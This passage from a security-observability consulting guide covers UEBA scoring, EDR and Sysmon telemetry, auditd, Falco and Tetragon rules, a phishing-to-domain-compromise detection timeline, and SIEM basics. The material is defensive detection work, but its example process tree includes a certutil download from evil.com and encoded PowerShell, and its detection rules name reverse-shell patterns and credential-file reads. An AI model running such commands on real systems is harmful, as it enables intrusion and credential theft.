|   +-- Normal devices (device fingerprint)
|   +-- Normal geolocation
|   +-- MFA usage patterns
+-- Access patterns
|   +-- Applications typically accessed
|   +-- Data volumes typically transferred
|   +-- File types typically accessed
|   +-- Database queries typically run
|   +-- API calls typically made
+-- Network patterns
|   +-- Internal hosts typically contacted
|   +-- External domains typically resolved
|   +-- Bandwidth utilization profile
|   +-- Protocol usage distribution
+-- Peer group comparison
    +-- Department / team behavior norms
    +-- Role-based access patterns
    +-- Organizational hierarchy context
```

**UEBA risk scoring model:**
```
Risk Score = SUM(Anomaly_Score x Weight x Context_Multiplier)

Where:
  Anomaly_Score  = Statistical deviation from baseline (0-100)
  Weight         = Importance of the behavioral dimension (0-1)
  Context_Multiplier = Asset criticality x User privilege level

Example scoring:
+----------------------------------+--------+--------+---------+-------+
| Event                            |Anomaly |Weight  |Context  |Score  |
|                                  |Score   |        |Mult.    |       |
+----------------------------------+--------+--------+---------+-------+
| Login from new country           | 85     | 0.9    | 1.5     | 114.8 |
| Access to finance share (new)    | 70     | 0.8    | 2.0     | 112.0 |
| Large download (5x normal)       | 60     | 0.7    | 1.5     |  63.0 |
| Login at 3am (unusual hour)      | 40     | 0.5    | 1.0     |  20.0 |
+----------------------------------+--------+--------+---------+-------+
| Total Risk Score                 |        |        |         | 309.8 |
| Alert Threshold                  |        |        |         | 250.0 |
| RESULT: ALERT TRIGGERED          |        |        |         |       |
+----------------------------------+--------+--------+---------+-------+
```

**UEBA implementation best practices (2025):**
- Establish baselines over minimum 30-day learning period
- Use both supervised (known attack patterns) and unsupervised (anomaly) ML models
- Temporal behavior modeling: analyze hourly, daily, and seasonal patterns
- Regularly refresh baselines when business operations shift (remote teams, seasonal)
- Risk scoring should account for anomaly frequency, severity, and system criticality
- False positives remain the top concern: immature baselining leads to alert fatigue

### 4.7 Zero Trust Continuous Verification

**Observability signals for Zero Trust policy engine:**

```
+----------------------------------------------------------+
|                   Zero Trust Policy Engine                 |
|                                                           |
|  Input Signals:              Decision:                    |
|  +------------------+       +------------------------+    |
|  | Identity          |--+   | ALLOW (full access)    |    |
|  | - Auth strength   |  |   | ALLOW (limited)        |    |
|  | - MFA status      |  |   | STEP-UP (require MFA)  |    |
|  | - Session age     |  +-->| ISOLATE (sandbox)      |    |
|  | - Risk score      |  |   | DENY (block)           |    |
|  +------------------+  |   +------------------------+    |
|  | Device            |  |                                 |
|  | - Patch level     |--+   Continuous re-evaluation:     |
|  | - EDR status      |  |   Every request is assessed     |
|  | - Compliance      |  |   based on current signals      |
|  +------------------+  |                                 |
|  | Network           |  |   Telemetry feedback loop:      |
|  | - Source IP/loc   |--+   All decisions logged for       |
|  | - Encryption      |  |   observability, anomaly         |
|  | - Protocol        |  |   detection, and policy          |
|  +------------------+  |   refinement                     |
|  | Behavior          |  |                                 |
|  | - UEBA score      |--+                                 |
|  | - Access pattern  |                                    |
|  | - Peer comparison |                                    |
|  +------------------+                                    |
+----------------------------------------------------------+
```

**Key zero trust observability principles (2025):**
- Identity is the new perimeter: policies should continuously verify both human and machine identities
- Collect and correlate telemetry from network, endpoint, identity, and cloud services
- Deep observability helps inspect encrypted and east-west traffic
- In 2026, zero trust shifts from conceptual frameworks to operational architecture
- Enterprise networks will enforce identity, segmentation, and policy as continuous behaviors

---

## 5. Endpoint Security Observability

### 5.1 Endpoint Detection and Response (EDR) Telemetry

EDR solutions collect telemetry from endpoints covering multiple observability dimensions:

| Telemetry Type | Data Collected | Security Use Cases |
|---|---|---|
| **Process creation** | Process name, PID, PPID, command line, user, hash, path | Malware execution, LOLBin abuse, living-off-the-land |
| **Process termination** | Process exit code, runtime duration | Detect killed security processes |
| **File operations** | Create, modify, delete, rename, hash changes | Ransomware (mass file modifications), dropper activity |
| **Registry changes** | Key create/modify/delete, value changes | Persistence mechanisms, defense evasion |
| **Network connections** | Source/dest IP, port, protocol, bytes, DNS resolution | C2 communication, data exfiltration, lateral movement |
| **Module/DLL loads** | DLL name, path, hash, signature status | DLL side-loading, reflective DLL injection |
| **Memory operations** | Allocation, protection changes, injection | Process injection, credential dumping |
| **User activity** | Logon/logoff, privilege changes, scheduled tasks | Account compromise, privilege escalation |

### 5.2 Process Tree Analysis

Process parent-child relationships are critical for detecting malicious activity:

```
Normal process tree:
  explorer.exe (user shell)
  +-- chrome.exe (browser)
  |   +-- chrome.exe (renderer)
  +-- outlook.exe (email)
  +-- cmd.exe (user-opened terminal)
      +-- ipconfig.exe (legitimate command)

Suspicious process tree (phishing -> exploitation):
  outlook.exe (email client)
  +-- WINWORD.EXE (opened malicious document)
      +-- cmd.exe (macro spawned shell)          <-- ALERT
          +-- powershell.exe -enc JABjAGw...     <-- ALERT (encoded PS)
              +-- certutil.exe -urlcache -f      <-- ALERT (LOLBin)
                  http://evil.com/payload.exe
              +-- payload.exe                     <-- ALERT (unknown)
                  +-- svchost.exe (injected)      <-- ALERT (injection)

Detection rules for suspicious parent-child:
  - WINWORD.EXE -> cmd.exe/powershell.exe  (macro execution)
  - EXCEL.EXE -> cmd.exe/powershell.exe    (macro execution)
  - mshta.exe -> powershell.exe            (HTA-based delivery)
  - svchost.exe -> cmd.exe (unexpected)    (service exploitation)
  - services.exe -> cmd.exe (not SYSTEM)   (service abuse)
  - wscript.exe -> powershell.exe          (script-based delivery)
```

**Sigma rule -- Suspicious Office child process:**
```yaml
title: Microsoft Office Process Spawning Suspicious Child
id: b7c8d9e0-2345-6789-cdef-789012345678
status: stable
description: |
    Detects Microsoft Office applications spawning command interpreters
    or other suspicious processes, which may indicate macro-based
    malware execution.
references:
    - https://attack.mitre.org/techniques/T1204/002/
tags:
    - attack.execution
    - attack.t1204.002
    - attack.initial_access
    - attack.t1566.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\WINWORD.EXE'
            - '\EXCEL.EXE'
            - '\POWERPNT.EXE'
            - '\OUTLOOK.EXE'
            - '\MSACCESS.EXE'
    selection_child:
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\mshta.exe'
            - '\regsvr32.exe'
            - '\rundll32.exe'
            - '\certutil.exe'
            - '\bitsadmin.exe'
    condition: selection_parent and selection_child
falsepositives:
    - Legitimate Office add-ins that spawn processes
    - Office automation scripts
level: high
```

### 5.3 Living-off-the-Land Binary (LOLBin) Detection

LOLBins are legitimate, pre-installed system tools abused by attackers to evade detection. PowerShell appears in 71% of living-off-the-land attacks (2025 telemetry data).

**Top LOLBins and their malicious uses:**

| Binary | Legitimate Use | Malicious Use | Detection Indicator |
|---|---|---|---|
| `powershell.exe` | System administration | Download cradles, encoded commands, AMSI bypass | `-enc`, `-nop`, `IEX`, `DownloadString` in command line |
| `certutil.exe` | Certificate management | Download files, encode/decode payloads | `-urlcache`, `-decode`, `-encode` flags |
| `mshta.exe` | Run HTML Applications | Execute remote HTA with embedded scripts | Network connection + script execution |
| `regsvr32.exe` | Register COM DLLs | Execute remote SCT files (Squiblydoo) | `/s /n /u /i:http://` pattern |
| `rundll32.exe` | Run DLL functions | Execute malicious DLLs, JavaScript | Unusual DLL paths, JavaScript execution |
| `bitsadmin.exe` | Background transfers | Download malicious files | `/transfer` with external URLs |
| `wmic.exe` | WMI command line | Remote execution, recon | `process call create`, `shadowcopy delete` |
| `msbuild.exe` | Build .NET projects | Execute inline C# tasks | Running outside development context |
| `csc.exe` | C# compiler | Compile and execute malicious code | Invoked by non-development processes |
| `installutil.exe` | .NET installer util | Bypass application whitelisting | Running unsigned assemblies |

**LOLBin Sigma rule -- Certutil download:**
```yaml
title: LOLBin Execution - Certutil Download
id: c8d9e0f1-3456-7890-defa-890123456789
status: stable
description: |
    Detects usage of certutil.exe to download files from external URLs,
    a common technique used by attackers to retrieve payloads while
    evading download monitoring.
references:
    - https://attack.mitre.org/techniques/T1105/
    - https://lolbas-project.github.io/
tags:
    - attack.command_and_control
    - attack.t1105
    - attack.defense_evasion
    - attack.t1218
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        Image|endswith: '\certutil.exe'
        OriginalFileName: 'CertUtil.exe'
    selection_download:
        CommandLine|contains:
            - 'urlcache'
            - 'verifyctl'
    selection_flags:
        CommandLine|contains:
            - '-f '
            - '/f '
            - '-split'
            - '/split'
    condition: selection_img and (selection_download or selection_flags)
falsepositives:
    - Legitimate certificate downloads by IT
level: high
```

**LOLBin detection improvement**: Behavioral analytics has proven 62% more effective than traditional signature-based approaches for LOTL detection. Organizations should enable detailed logging for PowerShell (Script Block Logging, EID 4104), WMI, and restrict execution of non-standard binaries via AppLocker or WDAC.

### 5.4 File Integrity Monitoring (FIM)

**Critical paths to monitor:**

| OS | Paths | Purpose |
|---|---|---|
| **Windows** | `C:\Windows\System32\` | OS binaries, DLL hijacking |
| | `C:\Windows\System32\drivers\etc\hosts` | DNS redirection |
| | `C:\Windows\System32\config\` | SAM, SECURITY, SYSTEM hives |
| | `HKLM\...\CurrentVersion\Run*` | Persistence |
| | `HKLM\SYSTEM\CurrentControlSet\Services\` | Service persistence |
| | `C:\Users\*\AppData\...\Startup\` | User persistence |
| **Linux** | `/etc/passwd`, `/etc/shadow`, `/etc/sudoers` | Credential and privilege modification |
| | `/etc/crontab`, `/var/spool/cron/` | Scheduled task persistence |
| | `/etc/ssh/sshd_config`, `~/.ssh/authorized_keys` | SSH backdoor |
| | `/etc/ld.so.preload` | Shared library injection |
| | `/etc/pam.d/` | Authentication module tampering |
| | `/usr/lib/systemd/system/` | Systemd service persistence |
| **macOS** | `/Library/LaunchDaemons/`, `/Library/LaunchAgents/` | Persistence |
| | `~/Library/LaunchAgents/` | User-level persistence |
| | `/etc/sudoers` | Privilege escalation |
| | TCC.db (`~/Library/Application Support/com.apple.TCC/`) | Permission bypass |

### 5.5 Memory Analysis and Process Injection Detection

**Common process injection techniques (MITRE T1055):**

| Sub-technique | ID | Method | Detection |
|---|---|---|---|
| DLL Injection | T1055.001 | `CreateRemoteThread` + `LoadLibrary` | Sysmon EID 8, unexpected DLL loads |
| PE Injection | T1055.002 | Write PE directly into target memory | MEM_COMMIT + PAGE_EXECUTE_READWRITE |
| Thread Execution Hijacking | T1055.003 | Suspend thread, modify context, resume | Sysmon EID 8, thread suspension patterns |
| Process Hollowing | T1055.012 | Create suspended process, unmap, replace | Sysmon EID 1 (suspended) + image mismatch |
| Reflective DLL Loading | T1620.001 | Load DLL from memory without disk | No file on disk, PE headers in MEM_COMMIT |
| Process Doppelganging | T1055.013 | Abuse NTFS transactions | NTFS transaction API from unexpected procs |

**Sysmon detection for process injection:**
```xml
<!-- Sysmon configuration for injection detection -->
<Sysmon schemaversion="4.90">
  <EventFiltering>
    <!-- EID 8: CreateRemoteThread - injection detection -->
    <CreateRemoteThread onmatch="include">
      <SourceImage condition="excludes">
        C:\Windows\System32\csrss.exe
      </SourceImage>
      <SourceImage condition="excludes">
        C:\Windows\System32\svchost.exe
      </SourceImage>
    </CreateRemoteThread>

    <!-- EID 10: ProcessAccess - credential dumping -->
    <ProcessAccess onmatch="include">
      <TargetImage condition="is">
        C:\Windows\System32\lsass.exe
      </TargetImage>
    </ProcessAccess>

    <!-- EID 7: Image Loaded - DLL side-loading -->
    <ImageLoad onmatch="include">
      <ImageLoaded condition="contains">
        \AppData\
      </ImageLoaded>
      <ImageLoaded condition="contains">
        \Temp\
      </ImageLoaded>
      <Signed condition="is">false</Signed>
    </ImageLoad>
  </EventFiltering>
</Sysmon>
```

### 5.6 Sysmon for Windows: Key Event IDs

**Critical Sysmon Event IDs for threat detection:**

| Event ID | Name | Security Value | Key Fields |
|---|---|---|---|
| **1** | Process Create | Malware execution, LOLBins, suspicious command lines | Image, CommandLine, ParentImage, Hashes, User |
| **3** | Network Connection | C2, beaconing, lateral movement, exfiltration | Image, DestinationIp, DestinationPort, Protocol |
| **7** | Image Loaded | DLL side-loading, unsigned DLL loads | Image, ImageLoaded, Signed, Signature |
| **8** | CreateRemoteThread | Process injection | SourceImage, TargetImage, StartAddress |
| **10** | ProcessAccess | Credential dumping (LSASS access) | SourceImage, TargetImage, GrantedAccess |
| **11** | FileCreate | Malware drops, persistence via files | Image, TargetFilename |
| **12** | RegistryEvent (Create/Delete) | Persistence via registry | Image, TargetObject |
| **13** | RegistryEvent (Value Set) | Persistence, configuration changes | Image, TargetObject, Details |
| **15** | FileCreateStreamHash | Alternate Data Streams (ADS) abuse | Image, TargetFilename, Hash |
| **17/18** | PipeEvent | Named pipe lateral movement (PsExec) | Image, PipeName |
| **22** | DNSEvent | DNS queries by process (C2 resolution) | Image, QueryName, QueryResults |
| **23** | FileDelete | Anti-forensics, ransomware evidence destruction | Image, TargetFilename, Hashes |
| **25** | ProcessTampering | Process hollowing, herpaderping | Image, Type |

**Recommended Sysmon configuration approach (2025 best practice):**

```
1. Start with community baseline:
   - SwiftOnSecurity/sysmon-config (conservative)
   - olafhartong/sysmon-modular (modular, comprehensive)

2. Key tuning steps:
   a. Enable EID 1 (Process Create) for ALL processes
      Exclude known-noisy processes only after validation
   b. Enable EID 3 (Network) selectively
      Include: powershell, cmd, wscript, cscript, mshta,
               rundll32, regsvr32, python, java
      Exclude: chrome, firefox, edge (too noisy)
   c. Enable EID 8 (CreateRemoteThread) with minimal exclusions
   d. Enable EID 10 (ProcessAccess) targeting lsass.exe
   e. Enable EID 11 (FileCreate) for high-risk paths
      C:\Users\*\AppData\Local\Temp\
      C:\Windows\Temp\
      C:\ProgramData\
   f. Enable EID 22 (DNS) for all processes

3. Expected log volume:
   ~5-15 MB per endpoint per day (well-tuned)
   EID 1 generates ~60% of events
   EID 11 generates ~20% of events

4. Future: Starting 2026, Sysmon functionality will be built
   directly into Windows 11 and Windows Server 2025 as an
   optional feature enabled via Windows Update.
```

### 5.7 Linux Security Monitoring

#### auditd Configuration

```bash
# /etc/audit/rules.d/ollystack-security.rules

# Self-auditing (protect audit config)
-w /etc/audit/ -p wa -k audit_config
-w /etc/libaudit.conf -p wa -k audit_config
-w /etc/audisp/ -p wa -k audit_config

# Identity and authentication
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/group -p wa -k identity
-w /etc/gshadow -p wa -k identity
-w /etc/sudoers -p wa -k privilege_escalation
-w /etc/sudoers.d/ -p wa -k privilege_escalation

# SSH monitoring
-w /etc/ssh/sshd_config -p wa -k sshd_config
-w /root/.ssh/ -p wa -k ssh_keys

# Persistence mechanisms
-w /etc/crontab -p wa -k persistence
-w /etc/cron.d/ -p wa -k persistence
-w /var/spool/cron/ -p wa -k persistence
-w /etc/systemd/system/ -p wa -k persistence
-w /usr/lib/systemd/system/ -p wa -k persistence
-w /etc/init.d/ -p wa -k persistence
-w /etc/ld.so.preload -p wa -k persistence

# Process execution
-a always,exit -F arch=b64 -S execve -k process_execution
-a always,exit -F arch=b32 -S execve -k process_execution

# Privilege escalation
-a always,exit -F arch=b64 -S setuid -S setgid \
   -S setreuid -S setregid -k privilege_escalation
-a always,exit -F arch=b64 -S setresuid \
   -S setresgid -k privilege_escalation

# Network connections
-a always,exit -F arch=b64 -S connect -k network_connect
-a always,exit -F arch=b64 -S accept -k network_connect
-a always,exit -F arch=b64 -S bind -k network_listen

# Kernel module loading
-a always,exit -F arch=b64 -S init_module \
   -S finit_module -k kernel_module
-a always,exit -F arch=b64 -S delete_module -k kernel_module

# File deletion (anti-forensics)
-a always,exit -F arch=b64 -S unlink -S unlinkat \
   -S rename -S renameat -k file_deletion

# Make config immutable (must reboot to change)
-e 2
```

#### eBPF-Based Monitoring: Falco and Tetragon

**Falco** is focused on detecting abnormal behavior at runtime, using a rule engine designed for security alerts. **Tetragon** is built for fine-grained observability and enforcement (e.g., blocking a process from spawning). Many teams combine both: Falco for detection, Tetragon for enforcement.

**Falco rules for Kubernetes runtime security:**
```yaml
# /etc/falco/rules.d/ollystack-k8s-security.yaml

# Detect container escape attempts
- rule: Container Escape via nsenter
  desc: Detect nsenter used to escape container namespace
  condition: >
    spawned_process and container and
    proc.name = "nsenter" and
    proc.args contains "--mount=/proc/1/ns/mnt"
  output: >
    Container escape attempt via nsenter
    (user=%user.name pod=%k8s.pod.name ns=%k8s.ns.name
     container=%container.name command=%proc.cmdline)
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation]

# Detect crypto mining
- rule: Detect Crypto Mining Process
  desc: Detect processes commonly associated with crypto mining
  condition: >
    spawned_process and container and
    (proc.name in (xmrig, minerd, minergate, cgminer) or
     proc.cmdline contains "stratum+tcp://" or
     proc.cmdline contains "--coin=" or
     proc.cmdline contains "-o pool.")
  output: >
    Crypto mining process detected
    (user=%user.name pod=%k8s.pod.name command=%proc.cmdline
     container=%container.name
     image=%container.image.repository)
  priority: CRITICAL
  tags: [container, crypto, mitre_resource_hijacking]

# Detect reverse shell
- rule: Reverse Shell in Container
  desc: Detect reverse shell creation inside a container
  condition: >
    spawned_process and container and
    ((proc.name in (bash, sh, dash, ash, zsh) and
      proc.cmdline contains "/dev/tcp/") or
     (proc.name = "python" and
      proc.cmdline contains "socket" and
      proc.cmdline contains "connect") or
     (proc.name = "nc" and proc.args contains "-e"))
  output: >
    Reverse shell detected in container
    (user=%user.name pod=%k8s.pod.name
     command=%proc.cmdline)
  priority: CRITICAL
  tags: [container, reverse_shell, mitre_execution]

# Detect sensitive file access
- rule: Read Sensitive File in Container
  desc: Detect reading of sensitive files with credentials
  condition: >
    open_read and container and
    (fd.name in (/etc/shadow, /etc/sudoers,
                  /root/.ssh/id_rsa,
                  /root/.ssh/id_ed25519,
                  /run/secrets/kubernetes.io/
                    serviceaccount/token) or
     fd.name pmatch (/etc/kubernetes/pki/*))
  output: >
    Sensitive file read in container
    (user=%user.name file=%fd.name
     pod=%k8s.pod.name command=%proc.cmdline)
  priority: WARNING
  tags: [container, filesystem, mitre_credential_access]
```

**Tetragon policy for enforcement:**
```yaml
# tetragon-policy.yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: block-suspicious-activity
spec:
  kprobes:
    - call: "security_file_open"
      syscall: false
      args:
        - index: 0
          type: "file"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Prefix"
              values:
                - "/etc/shadow"
                - "/etc/sudoers"
                - "/root/.ssh/"
          matchActions:
            - action: Sigkill    # Kill the process
            - action: Post       # Send event to userspace
    - call: "sys_ptrace"
      syscall: true
      args:
        - index: 0
          type: "int"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Equal"
              values:
                - "16"  # PTRACE_ATTACH
                - "17"  # PTRACE_SEIZE
          matchActions:
            - action: Sigkill
            - action: Post
```

**Performance comparison (2025 research):**
- Tetragon excels in detection time for container escape and cryptomining threats
- Falco excels in detecting DoS attacks
- All eBPF tools can detect attacks with full accuracy without false positives
- Combination of both provides ideal balance of detection and enforcement

### 5.8 macOS Security Monitoring

**Apple Endpoint Security Framework (ESF) event categories:**

| Category | Events | Security Use |
|---|---|---|
| **Process** | exec, fork, exit, signal | Process execution monitoring, malware detection |
| **File** | open, close, create, rename, unlink, write | FIM, ransomware detection, data exfiltration |
| **Network** | connect, bind, listen | C2 detection, lateral movement |
| **Authentication** | auth (OpenDirectory, smart card) | Brute force, credential attacks |
| **XProtect** | XProtect detection events | Known malware detection |
| **TCC** (macOS 15.4+) | TCC permission grants | Permission bypass, malware social engineering |

**Key macOS monitoring points:**
```
macOS Security Monitoring Checklist:
+-- XProtect
|   +-- Signature-based malware detection (auto-updated)
|   +-- YARA rules for known malware families
|   +-- Behavioral analysis engine (XProtect Remediator)
+-- TCC (Transparency, Consent, Control)
|   +-- Monitor TCC.db for unauthorized permission grants
|   +-- macOS 15.4: TCC events now in ESF (significant 2025 addition)
|   +-- Key permissions: Full Disk Access, Screen Recording,
|   |   Accessibility, Camera, Microphone, Contacts
|   +-- Most macOS malware relies on user TCC approval
+-- Launch Daemons / Agents
|   +-- /Library/LaunchDaemons/ (system-wide, root)
|   +-- /Library/LaunchAgents/ (system-wide, user session)
|   +-- ~/Library/LaunchAgents/ (per-user)
|   +-- Monitor for new plist files (persistence)
+-- Unified Log
|   +-- log stream --predicate 'subsystem=="com.apple.securityd"'
|   +-- log show --predicate 'process=="sudo"' --last 1h
|   +-- Central collection via osquery or EDR
+-- Gatekeeper
    +-- Notarization verification
    +-- Quarantine flag (com.apple.quarantine xattr)
    +-- Monitor for xattr removal (quarantine bypass)
```

---

## Appendix A: Real-World Attack Scenario -- End-to-End Detection

**Scenario: Phishing to Domain Compromise**

```
Timeline of a real-world attack with detection opportunities:

T+0:00 - DELIVERY (Kill Chain Stage 3)
  Event: Phishing email with macro-enabled Word document
  Log: Email gateway -> "Attachment: invoice_q4.docm from external"
  Detection: Sigma rule for macro-enabled attachments from external
  MITRE: T1566.001 (Spearphishing Attachment)

T+0:02 - EXPLOITATION (Kill Chain Stage 4)
  Event: User opens document, enables macros
  Log: Sysmon EID 1 -> WINWORD.EXE spawns cmd.exe
  Detection: Office application spawning command interpreter
  MITRE: T1204.002 (Malicious File), T1059.001 (PowerShell)

T+0:03 - INSTALLATION (Kill Chain Stage 5)
  Event: PowerShell downloads Cobalt Strike beacon
  Logs:
    - Sysmon EID 1  -> powershell.exe -enc <base64>
    - Sysmon EID 3  -> powershell.exe -> 203.0.113.50:443
    - Sysmon EID 11 -> C:\Users\...\Temp\update.exe
    - Sysmon EID 12 -> HKCU\...\CurrentVersion\Run
  Detection: Encoded PowerShell + network conn + file drop + persistence
  MITRE: T1059.001, T1105 (Ingress Tool Transfer), T1547.001

T+0:05 - COMMAND & CONTROL (Kill Chain Stage 6)
  Event: Cobalt Strike beacon establishes C2
  Logs:
    - DNS: Queries to randomly-generated domains (DGA)
    - Zeek ssl.log: JA3 hash matches known Cobalt Strike fingerprint
    - NetFlow: Regular 60-second interval HTTPS connections
  Detection: JA3 match + beaconing pattern + DGA domains
  MITRE: T1071.001 (Web Protocols), T1568.002 (DGA)

T+1:00 - CREDENTIAL ACCESS
  Event: Attacker dumps LSASS for credentials
  Logs:
    - Sysmon EID 10 -> update.exe accesses lsass.exe
                        (GrantedAccess: 0x1010)
    - Windows EID 4624 -> New logons with harvested credentials
  Detection: Non-standard process accessing LSASS
  MITRE: T1003.001 (LSASS Memory)

T+1:30 - LATERAL MOVEMENT
  Event: Attacker moves to domain controller via PsExec
  Logs:
    - Windows EID 4624 type 3 -> admin_svc logon on DC01
    - Windows EID 7045 -> PSEXESVC service installed on DC01
    - Zeek dce_rpc.log -> Remote service creation via DCE/RPC
    - NetFlow -> SMB (445) from WORKSTATION-42 to DC01
  Detection: Service installation + remote logon + SMB to DC
  MITRE: T1021.002 (SMB/Windows Admin Shares), T1569.002

T+2:00 - ACTIONS ON OBJECTIVES
  Event: DCSync to extract all domain credentials
  Logs:
    - Windows EID 4662 -> DS-Replication-Get-Changes from non-DC
    - Zeek kerberos.log -> Anomalous TGS requests
  Detection: Replication request from non-domain controller
  MITRE: T1003.006 (DCSync)

Detection summary: 12+ distinct detection opportunities across
5 different log sources (Sysmon, Windows Security, DNS, Zeek, NetFlow)
```

---

## Appendix B: Security Observability Technology Stack Reference

```
+--------------------------------------------------------------+
|                SECURITY OBSERVABILITY STACK                    |
+--------------------------------------------------------------+
| DETECTION & RESPONSE                                          |
|  SIEM: Splunk, Elastic Security, Microsoft Sentinel, Chronicle|
|  SOAR: Cortex XSOAR, Splunk SOAR, Tines, Shuffle             |
|  EDR:  CrowdStrike, SentinelOne, Microsoft Defender           |
|  NDR:  Vectra AI, Darktrace, Corelight, ExtraHop              |
+--------------------------------------------------------------+
| COLLECTION & PROCESSING                                       |
|  Collectors: OpenTelemetry Collector, Cribl Stream, Fluentd   |
|  Network:    Zeek, Suricata, Arkime (full PCAP)               |
|  Endpoint:   Sysmon, osquery, Velociraptor, auditd            |
|  Cloud:      CloudTrail, Azure Activity, GCP Audit            |
+--------------------------------------------------------------+
| ENRICHMENT & INTELLIGENCE                                     |
|  TIP:     MISP, ThreatConnect, Anomali, OpenCTI              |
|  Feeds:   AlienVault OTX, VirusTotal, AbuseIPDB, URLhaus     |
|  Formats: STIX 2.1, TAXII 2.1, OpenIOC, YARA                |
|  Schema:  OCSF, ECS, CEF, LEEF                               |
+--------------------------------------------------------------+
| ANALYSIS & HUNTING                                            |
|  Languages: Sigma (vendor-neutral), KQL, SPL, Lucene         |
|  Notebooks: Jupyter + MSTIC, Mordor datasets                  |
|  Frameworks: MITRE ATT&CK, D3FEND, NIST CSF, Kill Chain     |
|  UEBA:      Sentinel UEBA, Exabeam, Securonix                |
+--------------------------------------------------------------+
| RUNTIME SECURITY (Cloud-Native)                               |
|  Kubernetes: Falco, Tetragon, KubeArmor, NeuVector           |
|  Containers: Sysdig Secure, Aqua Security, Prisma Cloud      |
|  eBPF:       Cilium, Pixie, Hubble                            |
+--------------------------------------------------------------+
```

---

*This document is part of the OllyStack consulting knowledge base. Last updated: 2025-02-23.*


---

# Part II: SIEM, SOAR, and Cloud Security

---

## 1. SIEM Architecture and Fundamentals

### What is SIEM?

Security Information and Event Management (SIEM) combines Security Information Management (SIM) and Security Event Management (SEM) into a single platform for real-time analysis of security alerts generated by applications and network hardware.

### Core Architecture Components

```
+-----------------+     +------------------+     +-------------------+
| Data Collection |---->| Normalization &  |---->| Correlation &     |
| (Agents, APIs,  |     | Enrichment       |     | Detection Engine  |
|  Syslog, OTLP)  |     | (Parsing, CTI)   |     | (Rules, ML, UEBA)|
+-----------------+     +------------------+     +-------------------+
                                                          |
                              +---------------------------+
                              v
+-------------------+     +------------------+     +-------------------+
| Case Management & |<----| Alerting &       |<----| Risk Scoring &    |
| Investigation     |     | Notification     |     | Prioritization    |
+-------------------+     +------------------+     +-------------------+
         |
         v
+-------------------+
| SOAR Integration  |
| (Playbooks,       |
|  Automation)      |
+-------------------+
```

**1. Data Collection**
- Agent-based: Deployed on endpoints (Splunk Universal Forwarder, Elastic Agent, MMA/AMA, Wazuh Agent)
- Agentless: API polling, webhook receivers, cloud-native connectors
- Network-based: Syslog (RFC 5424/3164), NetFlow, SNMP traps
- Standard protocols: OTLP, CEF (Common Event Format), LEEF (Log Event Extended Format)
- Cloud connectors: AWS S3/SQS/CloudWatch, Azure Event Hubs/Diagnostic Settings, GCP Pub/Sub

**2. Normalization and Enrichment**
- Schema mapping: Raw logs mapped to common data models (CIM, ECS, UDM, OCSF)
- Threat intelligence enrichment: IP/domain/hash lookups against CTI feeds (STIX/TAXII)
- GeoIP enrichment: Source/destination location mapping
- Asset context: CMDB integration for asset criticality, owner, business unit
- Identity context: User-to-account mapping, privilege levels, group memberships

**3. Correlation and Detection**
- Rule-based: Pattern matching, threshold-based, sequence detection
- Statistical: Baseline deviations, anomaly detection
- Machine learning: UEBA (User and Entity Behavior Analytics), supervised classifiers
- Threat intelligence matching: IoC correlation against known indicators
- Graph-based: Entity relationship analysis for attack path detection

**4. Alerting and Triage**
- Priority-based routing (P1-P5)
- Risk-based alerting (aggregate risk scores rather than individual alerts)
- Alert suppression and deduplication
- Automated enrichment before analyst review
- SLA-based escalation

**5. Case Management**
- Incident creation and tracking
- Evidence collection and chain of custody
- Analyst assignment and workload balancing
- Playbook execution tracking
- Post-incident review and metrics

**6. SOAR Integration**
- Automated response playbooks
- Orchestration across security tools
- Ticket creation (ServiceNow, Jira)
- Communication (Slack, Teams, PagerDuty)

### Modern SIEM vs Legacy SIEM

| Aspect | Legacy SIEM | Modern Cloud-Native SIEM |
|--------|-------------|--------------------------|
| **Deployment** | On-premises appliances | SaaS / cloud-native |
| **Scaling** | Vertical (buy bigger hardware) | Horizontal (auto-scale compute/storage) |
| **Storage** | Fixed capacity, expensive hot storage | Tiered (hot/warm/cold), object storage |
| **Pricing** | EPS (events per second) licenses | GB/day, per-entity, or per-employee |
| **Detection** | Static correlation rules | Rules + ML + UEBA + threat intel |
| **Data Model** | Proprietary, inconsistent | Standardized (CIM, ECS, UDM, OCSF) |
| **Integration** | Custom parsers, limited APIs | REST APIs, marketplace content, native cloud |
| **Time-to-Value** | Months of professional services | Days to weeks with content packs |
| **Maintenance** | Dedicated SIEM team for tuning | Managed detections, auto-updates |
| **Investigation** | Manual pivot across tools | Unified investigation with entity pages |
| **Response** | Manual / semi-automated | Native SOAR with automated playbooks |

### Common Data Models

| Model | Used By | Key Features |
|-------|---------|--------------|
| **CIM** (Common Information Model) | Splunk | Field aliases, tags, data model acceleration |
| **ECS** (Elastic Common Schema) | Elastic | Nested field structure, extensible, open-source |
| **UDM** (Unified Data Model) | Google Chronicle | Event-centric, entity-centric, strongly typed |
| **OCSF** (Open Cybersecurity Schema Framework) | Amazon Security Lake, IBM | AWS-led open standard, 60+ event classes |
| **ASIM** (Advanced SIEM Information Model) | Microsoft Sentinel | KQL-based normalization parsers |
| **CEF** (Common Event Format) | ArcSight, many legacy SIEMs | Key-value pair format, widely supported |

---

## 2. Splunk Enterprise Security

### Architecture Overview

Splunk Enterprise Security (ES) is a premium app that runs on the Splunk platform, providing security-specific dashboards, correlation searches, notable events, and risk-based alerting.

```
+------------------+     +-------------------+     +------------------+
| Data Sources     |---->| Splunk Indexers    |---->| Splunk ES App    |
| - Forwarders     |     | - Parsing         |     | - Correlation    |
| - HEC (HTTP)     |     | - Indexing         |     | - Notable Events |
| - Syslog         |     | - CIM Mapping      |     | - Risk Index     |
| - APIs (Add-ons) |     | - Data Models      |     | - Dashboards     |
+------------------+     +-------------------+     +------------------+
                                                          |
                          +-------------------------------+
                          v
                   +------------------+
                   | Splunk SOAR      |
                   | (Phantom)        |
                   | - Playbooks      |
                   | - Adaptive Resp. |
                   +------------------+
```

### Search Processing Language (SPL) Security Examples

**Brute Force Detection**
```spl
index=auth sourcetype=WinEventLog:Security EventCode=4625
